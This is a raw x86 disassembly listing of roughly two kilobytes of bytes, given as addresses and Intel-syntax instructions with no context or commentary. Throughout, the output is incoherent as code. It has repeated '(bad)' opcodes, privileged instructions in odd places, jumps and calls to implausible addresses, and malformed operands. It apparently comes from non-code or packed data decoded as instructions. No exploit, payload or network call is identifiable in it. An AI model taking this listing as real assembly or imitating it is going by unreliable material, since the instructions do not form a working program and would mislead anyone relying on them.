  432fd8:	fmul   DWORD PTR [edx]
  432fda:	add    BYTE PTR [eax],al
  432fdc:	lea    eax,[ebx-0x4700273c]
  432fe2:	add    al,0x4f
  432fe4:	pop    DWORD PTR [eax]
  432fe6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432fec:	push   edx
  432fed:	inc    WORD PTR [ebp+0x8]
  432ff1:	mov    eax,0x514f4d
  432ff6:	(bad)
  432ffa:	add    al,al
  432ffc:	xor    DWORD PTR [ebx-0x74baf730],eax
  433002:	test   DWORD PTR [esi+0x74],esp
  433005:	inc    ebp
  433006:	mov    DWORD PTR [eax+0xa4f08],edi
  43300c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433012:	or     dh,cl
  433014:	or     eax,0x8b8d5045
  433019:	inc    ebp
  43301a:	mov    WORD PTR [ecx+0x3b8a00],?
  433020:	jne    0x433055
  433022:	mov    edi,DWORD PTR [edx+0x8f3a18]
  433028:	add    DWORD PTR [ebx],eax
  43302a:	add    bh,bh
  43302c:	adc    DWORD PTR [eax],ecx
  43302e:	adc    DWORD PTR [ebp+0x55],edi
  433031:	push   es
  433032:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  433038:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  43303f:	inc    ebp
  433040:	mov    esp,edi
  433042:	or     al,0xda
  433044:	push   eax
  433045:	(bad)  
  433046:	jne    0x432ffc
  433048:	call   0x3b2937
  43304d:	inc    ebp
  43304e:	rol    ah,0x84
  433051:	call   0xbc43f756
  433056:	jne    0x433032
  433058:	mov    ebx,ebx
  43305a:	inc    edi
  43305c:	and    al,al
  43305e:	fs jmp 0x7ec87663
  433064:	bswap  ecx
  433066:	scas   al,BYTE PTR es:[edi]
  433067:	inc    esp
  433068:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43306f:	or     BYTE PTR [ebx-0x97717c6],0x83
  433076:	call   DWORD PTR [edi]
  433078:	shr    ah,0x84
  43307b:	xchg   DWORD PTR [eax],eax
  43307d:	add    DWORD PTR [eax],eax
  43307f:	add    bh,bh
  433081:	dec    ebp
  433082:	and    BYTE PTR [ecx-0x38],dl
  433085:	push   eax
  433086:	dec    DWORD PTR [ebx+0xfd885]
  43308c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433092:	mov    WORD PTR [ecx+0x0],ss
  433095:	lea    ecx,[ebx+0x108b20d8]
  43309b:	mov    WORD PTR [edx],ds
  43309d:	add    BYTE PTR [edi+0xff01ff],al
  4330a3:	mov    ecx,DWORD PTR [ebp-0x28]
  4330a6:	push   ecx
  4330a7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4330ab:	inc    ebp
  4330ac:	in     al,0xeb
  4330ae:	jno    0x43303b
  4330b0:	push   edx
  4330b1:	mov    DWORD PTR [eax-0x28],edx
  4330b4:	mov    eax,DWORD PTR [ebp+0x20]
  4330b7:	je     0x433040
  4330b9:	mov    eax,DWORD PTR [ecx]
  4330bb:	sbb    BYTE PTR [eax],al
  4330bd:	pop    DWORD PTR [eax]
  4330bf:	add    esi,eax
  4330c1:	add    bl,al
  4330c3:	adc    DWORD PTR [edi],esi
  4330c5:	jmp    0x8bce8117
  4330ca:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  4330d1:	jne    0x43305e
  4330d3:	mov    ecx,DWORD PTR [eax]
  4330d5:	in     al,0x75
  4330d7:	pop    DWORD PTR [ecx+0x5101]
  4330dd:	push   edx
  4330de:	inc    DWORD PTR [ebx]
  4330e0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4330e6:	add    BYTE PTR [edi+0x9],dl
  4330e9:	call   DWORD PTR [esi]
  4330eb:	and    dl,al
  4330ed:	and    bh,bh
  4330ef:	inc    edi
  4330f1:	test   eax,edx
  4330f3:	sldt   ebx
  4330f6:	cmp    DWORD PTR [eax],eax
  4330f8:	pushf  
  4330f9:	(bad)  
  4330fa:	jmp    0x433108
  4330fc:	mov    eax,edi
  4330fe:	or     al,0x75
  433100:	inc    eax
  433101:	call   0x432809
  433106:	mov    eax,eax
  433108:	loopne 0x43308e
  43310a:	inc    ebp
  43310b:	add    BYTE PTR [ebx+0x1451c00],cl
  433111:	mov    eax,DWORD PTR [ebp+0x20]
  433114:	add    edi,ecx
  433116:	add    BYTE PTR [eax],ch
  433118:	cmp    edi,0x18
  43311b:	test   DWORD PTR [ebp+0xf],esi
  43311e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  433125:	jne    0x433129
  433127:	call   0xffa22bec
  43312c:	leave  
  43312d:	rcr    BYTE PTR [esp+eax*4],0x55
  433131:	add    ah,ch
  433133:	add    BYTE PTR [edi-0x48fef979],dh
  433139:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  433140:	inc    esp
  433141:	mov    ebx,DWORD PTR [eax]
  433143:	fcom   st(2)
  433145:	add    BYTE PTR [edi],bl
  433147:	lea    ecx,[eax-0x18]
  43314a:	(bad)  
  43314b:	push   DWORD PTR [ecx]
  43314d:	call   0xffb57eaf
  433152:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  433156:	fstp   DWORD PTR [esi+ebx*8]
  433159:	push   ebp
  43315a:	pop    ebp
  43315b:	mov    esi,DWORD PTR [edx-0x38]
  43315e:	add    DWORD PTR [eax],0x28
  433161:	mov    edi,DWORD PTR [ebx]
  433163:	xor    esi,DWORD PTR [edx+0x3]
  433166:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43316a:	pop    ebp
  43316b:	or     al,0x4
  43316d:	inc    ecx
  43316e:	push   ebp
  43316f:	(bad)  
  433170:	in     al,dx
  433171:	or     ah,ch
  433173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433174:	xbegin 0xffc8a76a
  43317a:	clc    
  43317b:	adc    al,0x45
  43317d:	idiv   BYTE PTR [ecx]
  43317f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433186:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43318c:	add    BYTE PTR [ecx+0x66],dh
  43318f:	add    eax,DWORD PTR [ebp+0x52]
  433192:	adc    eax,0x20
  433195:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43319b:	test   DWORD PTR [eax],eax
  43319d:	clc    
  43319e:	data16 or al,BYTE PTR [ebp+0x45]
  4331a2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4331a9:	rol    BYTE PTR [ebp+0x45],1
  4331ac:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4331b2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4331b8:	push   ebx
  4331b9:	add    BYTE PTR [ecx+0x0],dl
  4331bc:	push   ecx
  4331bd:	jge    0x4331f2
  4331bf:	add    BYTE PTR [esi+0x4],dl
  4331c2:	jne    0x433229
  4331c4:	mov    edx,0x457200
  4331c9:	jmp    0x43318d
  4331cb:	xor    edi,DWORD PTR [ebx]
  4331cd:	pop    edi
  4331ce:	cvtdq2ps xmm7,xmm0
  4331d1:	ret    0x0
  4331d4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4331da:	xor    ecx,DWORD PTR [edi]
  4331dc:	add    eax,DWORD PTR [ecx+0x3b]
  4331df:	push   ebx
  4331e0:	rdpmc  
  4331e2:	out    0x8d,al
  4331e4:	add    BYTE PTR [eax],cl
  4331e6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4331ec:	ret    0x450c
  4331ef:	sbb    al,0x8b
  4331f1:	cmp    eax,esi
  4331f3:	or     cl,al
  4331f5:	or     al,0xc2
  4331f7:	pop    eax
  4331f8:	inc    ebp
  4331f9:	add    ecx,DWORD PTR [edi]
  4331fb:	add    esi,DWORD PTR [ebp+0x39]
  4331fe:	invd   
  433200:	jge    0x43320c
  433202:	mov    eax,0x478ac0
  433207:	cli    
  433208:	xor    esp,ecx
  43320a:	mov    ebx,0x5b8ac0
  43320f:	ret    0x33
  433212:	mov    eax,0x833a8b
  433217:	sub    BYTE PTR [ebx],al
  433219:	inc    ebp
  43321a:	data16 ss clc 
  43321d:	pushf  
  43321e:	inc    bh
  433220:	mov    esp,esp
  433222:	hlt    
  433223:	test   DWORD PTR [ebp-0x8],esi
  433226:	mov    eax,DWORD PTR [ebp-0x14]
  433229:	cmp    BYTE PTR [ebx-0x76478864],cl
  43322f:	dec    edi
  433230:	or     BYTE PTR [eax],al
  433232:	jne    0x4331bd
  433234:	mov    esi,esp
  433236:	call   0x77a9bdfb
  43323b:	inc    ebp
  43323c:	mov    DWORD PTR [eax+0x994f0c],edi
  433242:	add    BYTE PTR [ecx-0x3ffe0717],cl
  433248:	add    BYTE PTR [esi+0x7d],ah
  43324b:	inc    ebp
  43324c:	mov    bx,WORD PTR [ebp+0x8]
  433250:	add    DWORD PTR [ebp+0x51],0x30c008b
  433257:	inc    ebp
  433258:	mov    bx,di
  43325b:	lock test BYTE PTR [ecx+0x7000801],bh
  433262:	jge    0x433225
  433264:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  43326a:	cli    
  43326b:	xor    bl,bh
  43326d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  433273:	test   BYTE PTR [eax],cl
  433275:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43327c:	cmp    ebp,eax
  43327e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433285:	test   BYTE PTR [ebp+0x1],bh
  433288:	mov    ebx,0x458a00
  43328d:	xor    esi,DWORD PTR [ebx]
  43328f:	add    esp,DWORD PTR [esi-0x77]
  433292:	pop    ebp
  433293:	loopne 0x4332fb
  433295:	inc    ebp
  433296:	clc    
  433297:	xor    edi,DWORD PTR [ebx]
  433299:	add    esi,DWORD PTR [edx-0x77]
  43329c:	data16 fdivr QWORD PTR [ebp-0x49]
  4332a0:	mov    ebx,0xb78afc
  4332a5:	hlt    
  4332a6:	xor    edi,DWORD PTR [eax]
  4332a8:	data16 add BYTE PTR [ebp+0x66],bl
  4332ac:	data16 lock clc 
  4332af:	cmp    BYTE PTR [ebx],bh
  4332b1:	add    BYTE PTR [edi+0x66],dh
  4332b4:	psubq  mm7,QWORD PTR [ebp-0x2]
  4332b8:	ltr    WORD PTR [ebp+0x66]
  4332bc:	add    esi,eax
  4332be:	add    di,WORD PTR [ebp+0x2b]
  4332c2:	data16 data16 jge 0x433343
  4332c6:	mov    ebx,0xe08a8b
  4332cb:	jge    0x433300
  4332cd:	data16 data16 xor al,0x5d
  4332d1:	data16 data16 jne 0x4332cd
  4332d5:	mov    edi,DWORD PTR [ebx]
  4332d7:	fdiv   QWORD PTR [edx+0x7d]
  4332da:	data16 data16 jge 0x433312
  4332de:	mov    ebx,0x758a66
  4332e3:	mov    esi,0x667233
  4332e8:	pop    ebp
  4332e9:	or     BYTE PTR [esi+0x0],ah
  4332ec:	clc    
  4332ed:	mov    edi,DWORD PTR [ebx]
  4332ef:	lock ja 0x43327d
  4332f2:	(bad)  
  4332f4:	jge    0x4332ed
  4332f6:	invd   
  4332f8:	pop    ebp
  4332f9:	add    BYTE PTR [ebx],al
  4332fb:	(bad)  
  4332fc:	cmp    di,WORD PTR [ebp+0xf]
  433300:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433304:	mov    bx,WORD PTR [ebp-0x10]
  433308:	pop    bp
  43330a:	fbstp  TBYTE PTR [ebx]
  43330c:	test   DWORD PTR [ebx],eax
  43330e:	add    BYTE PTR [ebx],bh
  433310:	add    BYTE PTR [esi+0x7d],ah
  433313:	jge    0x4332a0
  433315:	data16 in al,dx
  433317:	pop    ebp
  433318:	stc    
  433319:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  433320:	mov    edi,ebx
  433322:	in     al,dx
  433323:	test   BYTE PTR [ebp+0x0],bh
  433326:	mov    eax,DWORD PTR [eax]
  433328:	call   0xbd402cb8
  43332d:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  433333:	sti    
  433334:	call   0x8b4bb0c4
  433339:	add    ebp,esp
  43333b:	mov    bx,di
  43333e:	jnp    0x433366
  433340:	mov    DWORD PTR [ebx+0x387df808],ecx
  433346:	mov    eax,DWORD PTR [eax]
  433348:	call   0x7c3ebeb3
  43334d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  433353:	data16 data16 fistp WORD PTR [ebp+0xe]
  433358:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  433362:	fisttp WORD PTR [ecx-0x7401f77b]
  433368:	(bad)  
  433369:	cld    
  43336a:	jne    0x4333a4
  43336c:	xor    eax,DWORD PTR [eax]
  43336e:	mov    esp,DWORD PTR [esi-0x10]
  433371:	sti    
  433372:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  433379:	data16 adc bl,bh
  43337c:	push   ebp
  43337d:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433384:	mov    WORD PTR [eax],es
  433386:	cdq    
  433387:	data16 xor bh,bl
  43338a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433390:	mov    esp,DWORD PTR [esi-0x14]
  433393:	fisttp WORD PTR [ebx-0x3748a9f2]
  433399:	or     al,0x2b
  43339b:	mov    bh,0xba
  43339d:	hlt    
  43339e:	mov    bh,bl
  4333a0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4333a6:	dec    edi
  4333a7:	or     al,0x0
  4333a9:	mov    edi,DWORD PTR [ebx]
  4333ab:	or     BYTE PTR [ebp+0x3b],dh
  4333ae:	mov    ecx,DWORD PTR [edi]
  4333b0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4333b6:	xor    al,0xd8
  4333b8:	pop    bp
  4333ba:	lock xor esi,DWORD PTR [ebx]
  4333bd:	lea    esp,[esi+0x1f]
  4333c0:	icebp  
  4333c1:	jb     0x4333c7
  4333c3:	add    al,al
  4333c5:	jge    0x4333d3
  4333c7:	mov    eax,eax
  4333c9:	fsubr  st,st(3)
  4333cb:	pop    ebp
  4333cc:	mov    esi,DWORD PTR [ebx]
  4333ce:	in     al,0x8d
  4333d0:	rcr    DWORD PTR [edi],0xc2
  4333d3:	jb     0x433433
  4333d5:	add    cl,cl
  4333d7:	jge    0x4333e5
  4333d9:	mov    edx,DWORD PTR [ebp-0x20]
  4333dc:	in     al,dx
  4333dd:	pop    ebp
  4333de:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4333e3:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4333e7:	mov    ebp,DWORD PTR [ebx]
  4333e9:	fdivr  QWORD PTR [esi+0x668a5d]
  4333ef:	cmp    al,0x33
  4333f1:	mov    si,0x4f7d
  4333f5:	mov    eax,DWORD PTR [eax]
  4333f7:	lock inc ebp
  4333f9:	mov    esi,DWORD PTR [edi]
  4333fb:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433402:	clc    
  433403:	(bad)  
  433404:	cmp    edi,DWORD PTR [ebx]
  433406:	je     0x433417
  433408:	push   ebx
  433409:	loopne 0x43341a
  43340b:	dec    ecx
  43340d:	mov    esp,DWORD PTR [edi-0x1c]
  433410:	int    0xf1
  433412:	mov    esi,0x703084d
  433417:	pcmpgtd mm6,mm1
  43341a:	add    BYTE PTR [ebp+0x66],dh
  43341d:	jmp    0x4333ea
  43341f:	mov    eax,DWORD PTR [ebx]
  433421:	lock push ebp
  433423:	ror    DWORD PTR [ebp-0x2972feb3],1
  433429:	or     bh,dl
  43342b:	jb     0x43342b
  43342d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  433433:	loopne 0x433435
  433435:	jne    0x433435
  433437:	data16 add BYTE PTR [esi+eiz*2],dh
  43343b:	mov    ecx,ebx
  43343d:	data16 cmp cl,dh
  433440:	add    BYTE PTR [eax],bh
  433442:	data16 add bl,cl
  433445:	data16 cmp dh,dl
  433448:	add    BYTE PTR [edx],bh
  43344a:	data16 add bl,cl
  43344d:	enterw 0x4df1,0x19
  433452:	pop    edi
  433453:	jne    0x4333d6
  433455:	mov    esi,DWORD PTR [edi]
  433457:	call   0x77b7bff8
  43345c:	xor    ebp,DWORD PTR [ebx]
  43345e:	lea    esp,[esi+0x48]
  433461:	repnz in eax,0x3b
  433464:	add    BYTE PTR [ebp-0x37],dh
  433467:	xor    edx,DWORD PTR [ebp-0x15]
  43346a:	in     al,dx
  43346b:	xor    edx,DWORD PTR [esi+0x40]
  43346e:	mov    DWORD PTR [edi],0x338545fc
  433474:	clc    
  433475:	add    esi,DWORD PTR [esi]
  433477:	pop    edi
  433478:	pushf  
  433479:	pop    ebx
  43347a:	call   0xff443441
  43347f:	mov    edi,eax
  433481:	push   ecx
  433482:	pop    es
  433483:	mov    edi,DWORD PTR [edx]
  433485:	push   esi
  433486:	inc    esp
  433487:	(bad)  
  433488:	jle    0x43348a
  43348a:	popa   
  43348b:	data16 (bad) 
  43348d:	into   
  43348e:	addr16 cmp ch,cl
  433491:	add    BYTE PTR [ecx+0x7ce0866],bh
  433497:	cmp    ah,BYTE PTR [esi+0x0]
  43349a:	add    bh,al
  43349c:	(bad)  
  43349d:	cld    
  43349e:	add    BYTE PTR [ebp+0x36c3f866],al
  4334a4:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  4334ab:	pop    ebp
  4334ac:	or     BYTE PTR [edi+0x0],dl
  4334af:	mov    bh,0x66
  4334b1:	mov    edi,0xff038dc3
  4334b6:	jne    0x433509
  4334b8:	lea    edx,[ecx+0x1]
  4334bb:	mov    ebx,0xd64ff1
  4334c0:	sar    DWORD PTR [ebx],1
  4334c2:	test   BYTE PTR [ebp+0x32],dh
  4334c5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4334c9:	push   edi
  4334ca:	xor    BYTE PTR [ebx],0x3a
  4334cd:	mov    esi,ebx
  4334cf:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4334d5:	xor    al,BYTE PTR [ebp+0x64]
  4334d8:	pop    ebx
  4334d9:	mov    ebx,0x9c3a37
  4334de:	je     0x43350b
  4334e0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4334e6:	mov    WORD PTR [ebx],?
  4334e8:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  4334ee:	pop    edi
  4334ef:	cmp    ecx,ecx
  4334f1:	jne    0x433548
  4334f3:	mov    ebp,esp
  4334f5:	cld    
  4334f6:	push   esi
  4334f7:	pop    ebx
  4334f8:	inc    ebp
  4334f9:	stc    
  4334fa:	aaa    
  4334fb:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433502:	clc    
  433503:	test   dl,dl
  433505:	xor    al,0xff
  433507:	fs pop si
  43350a:	or     bl,al
  43350c:	dec    BYTE PTR [ebx+0x57665100]
  433512:	retf   0x3845
  433515:	aaa    
  433516:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43351d:	clc    
  43351e:	add    BYTE PTR [ebx+0x66],bl
  433521:	dec    edx
  433523:	mov    edx,DWORD PTR [edi-0x76]
  433526:	push   edi
  433527:	add    al,0xb7
  433529:	xor    al,0xba
  43352b:	cmp    al,0x8d
  43352d:	je     0x43352e
  43352f:	mov    edx,DWORD PTR [ecx-0x46]
  433532:	push   ecx
  433533:	lea    edi,[ebx+0x514fff]
  433539:	push   ecx
  43353a:	cmp    edx,DWORD PTR [ebx+0x75]
  43353d:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  433543:	add    BYTE PTR [ebx],dh
  433545:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43354b:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  433552:	mov    ebx,0x3b3a00
  433557:	jne    0x433584
  433559:	mov    DWORD PTR [ebx+0x728afc],edi
  43355f:	xor    esi,DWORD PTR [ebx]
  433561:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  433567:	push   edi
  433568:	cmp    esp,ebp
  43356a:	jne    0x43356c
  43356c:	sbb    DWORD PTR [eax],0x8085c3fc
  433572:	clc    
  433573:	inc    esp
  433574:	pop    ebx
  433575:	sti    
  433576:	add    eax,0xeb8bc075
  43357b:	cld    
  43357c:	xor    edi,DWORD PTR ds:0xf8c3855e
  433582:	mov    ecx,DWORD PTR [ecx+edx*2]
  433585:	rol    DWORD PTR [ebp-0x37],0xf
  433589:	mov    DWORD PTR [eax],ecx
  43358b:	inc    edi
  43358c:	(bad)  
  43358d:	in     eax,0x2
  43358f:	add    bh,bh
  433591:	(bad)  
  433592:	mov    esi,0xc38a5e
  433597:	mov    esi,DWORD PTR [ebx]
  433599:	push   ecx
  43359a:	mov    edi,0xfc4fc7
  43359f:	test   DWORD PTR [ebp-0x8],edx
  4335a2:	data16 ss (bad) 
  4335a5:	pushf  
  4335a6:	sub    ebp,eax
  4335a8:	inc    ebp
  4335a9:	(bad)  
  4335aa:	sub    edi,edi
  4335ac:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4335b2:	inc    ebp
  4335b3:	add    BYTE PTR [esi+0x2b],ah
  4335b6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4335bc:	cmp    al,0x33
  4335be:	mov    edi,DWORD PTR [edx+0x24f81]
  4335c4:	(bad)  
  4335c5:	cmp    esi,DWORD PTR [ebx]
  4335c7:	je     0x433581
  4335c9:	push   ebx
  4335ca:	dec    edi
  4335cb:	str    ecx
  4335ce:	cmp    esp,DWORD PTR [edi+0x75]
  4335d1:	int    0x33
  4335d3:	mov    edi,0x789085f
  4335d8:	mov    ecx,DWORD PTR [eax]
  4335da:	cld    
  4335db:	add    cl,cl
  4335dd:	data16 add al,0xcb
  4335e0:	push   ebp
  4335e1:	add    ebp,esp
  4335e3:	jne    0x4335d1
  4335e5:	(bad)  
  4335e6:	mov    DWORD PTR [ecx],0xd685f7ec
  4335ec:	clc    
  4335ed:	xlat   BYTE PTR ds:[ebx]
  4335ee:	inc    ebp
  4335ef:	mov    edi,DWORD PTR [ecx]
  4335f1:	push   eax
  4335f2:	pushf  
  4335f3:	in     eax,0x8b
  4335f5:	add    ah,ch
  4335f7:	(bad)  
  4335f8:	push   ecx
  4335f9:	add    BYTE PTR [ecx+0x66],dl
  4335fc:	add    eax,0x3872cb
  433601:	add    BYTE PTR [ebp+0x66],al
  433604:	(bad)  
  433605:	retf   
  433606:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43360d:	retf   
  43360e:	cmp    cl,al
  433610:	pushf  
  433611:	jge    0x4335da
  433613:	aaa    
  433614:	cld    
  433615:	pushf  
  433616:	test   DWORD PTR [edi-0x8],ebx
  433619:	je     0x433660
  43361b:	xor    esi,DWORD PTR ds:0x7020840
  433621:	ror    BYTE PTR [ebp-0x37],0x8d
  433625:	push   ebp
  433626:	add    esp,ebp
  433628:	jb     0x4335b5
  43362a:	add    BYTE PTR [eax],cl
  43362c:	dec    ebp
  43362d:	mov    bh,0x81
  43362f:	push   esi
  433630:	push   ecx
  433631:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  433638:	xor    al,BYTE PTR [eax]
  43363a:	mov    edx,DWORD PTR [edi+0x10]
  43363d:	(bad)  
  43363e:	scas   eax,DWORD PTR es:[edi]
  43363f:	cmp    bh,BYTE PTR [ebx]
  433641:	add    BYTE PTR [edi],cl
  433643:	mov    ebp,ebp
  433645:	cld    
  433646:	add    BYTE PTR [ebx],bh
  433648:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43364c:	dec    ebp
  43364d:	or     BYTE PTR [ebx],ch
  43364f:	ret    0x458b
  433652:	lock jmp 0x433646
  433655:	mov    ecx,DWORD PTR [eax]
  433657:	or     BYTE PTR [edi],al
  433659:	mov    ecx,eax
  43365b:	xor    DWORD PTR [edx+0x2],0x0
  43365f:	mov    bh,0xc1
  433661:	adc    BYTE PTR [eax],dh
  433663:	iret   
  433664:	inc    ebp
  433665:	mov    DWORD PTR [ebx],0x4dfff8c5
  43366b:	inc    BYTE PTR [ebx]
  43366d:	cmp    bh,al
  43366f:	add    BYTE PTR [ecx],dl
  433671:	data16 adc al,bh
  433674:	dec    ecx
  433675:	fisttp WORD PTR [ecx+0x456604c0]
  43367b:	add    dh,BYTE PTR ds:0x75e0845
  433681:	ret    0x4d
  433684:	lea    ecx,[ebx+0x18728301]
  43368a:	add    BYTE PTR [ebp+0x45],al
  43368d:	ss jmp 0x10a372f
  433693:	call   0xf8cebbdd
  433698:	clc    
  433699:	inc    ebp
  43369a:	shl    DWORD PTR ds:0x781084d,0x51
  4336a1:	cdq    
  4336a2:	push   ecx
  4336a3:	xor    al,BYTE PTR [ecx+0x32f89989]
  4336a9:	inc    ebp
  4336aa:	cmp    edi,DWORD PTR [esi]
  4336ac:	jbe    0x43364a
  4336ae:	mov    eax,edi
  4336b0:	or     ah,dh
  4336b2:	inc    ebp
  4336b3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4336b9:	cmp    BYTE PTR [ebx-0x74747664],cl
  4336bf:	in     al,dx
  4336c0:	hlt    
  4336c1:	push   ecx
  4336c2:	push   ecx
  4336c3:	push   ecx
  4336c4:	push   ecx
  4336c5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4336cb:	cdq    
  4336cc:	cdq    
  4336cd:	xor    dh,BYTE PTR [edx]
  4336cf:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4336d5:	or     BYTE PTR [ebp+0x7],al
  4336d8:	mov    eax,ecx
  4336da:	clc    
  4336db:	jb     0x43369e
  4336dd:	add    BYTE PTR [ebp+0x55],cl
  4336e0:	or     DWORD PTR [edi],0xc251d151
  4336e6:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  4336f0:	mov    edi,eax
  4336f2:	or     cl,al
  4336f4:	inc    ebp
  4336f5:	dec    ebp
  4336f6:	mov    eax,DWORD PTR [ecx+0x514d510c]
  4336fc:	or     WORD PTR [ecx],0x8999
  433701:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433707:	mov    edx,DWORD PTR [ecx+0x8]
  43370a:	mov    eax,DWORD PTR [ebp-0x8]
  43370d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433714:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43371a:	inc    ebp
  43371b:	dec    eax
  43371c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  433722:	add    edx,DWORD PTR [ecx-0x8]
  433725:	mov    ecx,DWORD PTR [ecx]
  433727:	clc    
  433728:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  43372f:	mov    ecx,ebp
  433731:	clc    
  433732:	(bad)  
  433733:	popf   
  433734:	inc    DWORD PTR [eax]
  433736:	ret    0x8b
  433739:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43373f:	mov    edi,esp
  433741:	hlt    
  433742:	test   ecx,esi
  433744:	clc    
  433745:	or     BYTE PTR [ebp+0x7],al
  433748:	cmp    ecx,eax
  43374a:	pushf  
  43374b:	jb     0x433780
  43374d:	add    BYTE PTR [eax-0x3f],al
  433750:	inc    eax
  433751:	daa    
  433752:	inc    ebp
  433753:	inc    ebp
  433754:	xor    eax,0x7f80803
  433759:	dec    ebp
  43375a:	cdq    
  43375b:	add    esi,DWORD PTR [edx]
  43375d:	clc    
  43375e:	cmp    DWORD PTR [ecx],ecx
  433760:	or     al,0x8
  433762:	add    al,BYTE PTR [ebp+0x2c]
  433765:	xor    eax,0x7350845
  43376a:	or     BYTE PTR [ebp+0x7],cl
  43376d:	lea    ebx,[ecx-0x748dcdff]
  433773:	add    BYTE PTR [eax*2-0x74b21438],cl
  43377a:	mov    edx,DWORD PTR [eax]
  43377c:	cld    
  43377d:	dec    ebp
  43377e:	push   ecx
  43377f:	sub    edx,DWORD PTR [ecx-0x75]
  433782:	add    eax,0xf172fc
  433787:	or     BYTE PTR [ebp+0x7],cl
  43378a:	add    eax,ecx
  43378c:	or     al,0x72
  43378e:	add    DWORD PTR [eax],eax
  433790:	mov    ebx,0x29c2c1
  433795:	inc    ebp
  433796:	mov    eax,DWORD PTR [ebx]
  433798:	cmp    eax,0x3004d1c
  43379e:	xbegin 0x66c8c398
  4337a4:	clc    
  4337a5:	or     BYTE PTR [ebp+0x45],al
  4337a8:	cmp    DWORD PTR ds:0x78b089c,esi
  4337ae:	adc    BYTE PTR [ebp+0x45],cl
  4337b1:	lea    eax,[ebp+0x33727501]
  4337b7:	add    cl,ch
  4337b9:	inc    ebp
  4337ba:	add    bl,ch
  4337bc:	add    BYTE PTR [ebx+0x45850845],cl
  4337c2:	je     0x43374f
  4337c4:	push   ebx
  4337c5:	or     al,0x85
  4337c7:	dec    ebp
  4337c8:	std    
  4337c9:	mov    bh,bh
  4337cb:	mov    BYTE PTR [ebp-0x75],al
  4337ce:	mov    edi,eax
  4337d0:	or     al,0x89
  4337d2:	inc    ebp
  4337d3:	clc    
  4337d4:	mov    esp,esp
  4337d6:	hlt    
  4337d7:	call   DWORD PTR [edi-0x37]
  4337da:	push   ecx
  4337db:	or     al,0x51
  4337dd:	push   ebp
  4337de:	xor    ebp,esp
  4337e0:	mov    esi,0x457251
  4337e5:	ss (bad) 
  4337e7:	pushf  
  4337e8:	inc    ebp
  4337e9:	(bad)  
  4337ea:	mov    edi,eax
  4337ec:	or     al,0x85
  4337ee:	add    al,bh
  4337f0:	inc    eax
  4337f2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4337f6:	or     ah,bh
  4337f8:	inc    eax
  4337f9:	push   ecx
  4337fa:	jmp    0x43384d
  4337fc:	mov    eax,DWORD PTR ds:0xe8720c
  433802:	mov    DWORD PTR [ebp-0x8],eax
  433805:	jne    0x43384c
  433807:	jmp    0x433794
  433809:	mov    ebp,DWORD PTR [eax]
  43380b:	clc    
  43380c:	retf   0xff51
  43380f:	push   ecx
  433810:	mov    DWORD PTR ds:0x757210,eax
  433816:	mov    ecx,DWORD PTR [ebp-0x4]
